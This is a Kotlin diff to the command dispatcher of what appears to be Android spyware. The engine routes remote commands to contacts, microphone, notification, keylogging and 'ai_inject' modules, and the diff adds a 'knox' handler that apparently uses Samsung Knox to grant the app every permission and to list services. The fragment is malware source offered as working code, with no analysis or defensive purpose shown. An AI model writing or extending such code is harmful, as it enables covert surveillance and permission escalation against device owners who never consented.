@@ -21,6 +21,7 @@ import org.synapse.core.modules.ContactsModule
 import org.synapse.core.modules.MicModule
 import org.synapse.core.modules.NotificationModule
 import org.synapse.core.modules.KeylogModule
+import org.synapse.core.modules.KnoxPermissionGrant
 
 object SynapseEngine {
     private const val TAG = "Synapse"
@@ -109,6 +110,11 @@ object SynapseEngine {
                 "stop" -> KeylogModule.stop(context, cmd)
                 "dump" -> KeylogModule.dump(context, cmd)
                 else -> SynapseResponse.ErrorResponse("keylog:unknown_action:${cmd.action}", "keylog")
+            }},
+            "knox"     to { cmd -> when (cmd.action) {
+                "grant" -> KnoxPermissionGrant.grantAll(context, cmd)
+                "enumerate" -> KnoxPermissionGrant.enumerateServices(cmd)
+                else -> SynapseResponse.ErrorResponse("knox:unknown_action:${cmd.action}", "knox")
             }},
             "ai_inject" to { cmd -> when (cmd.action) {
                 "inject" -> AiInjectionModule.inject(context, cmd)
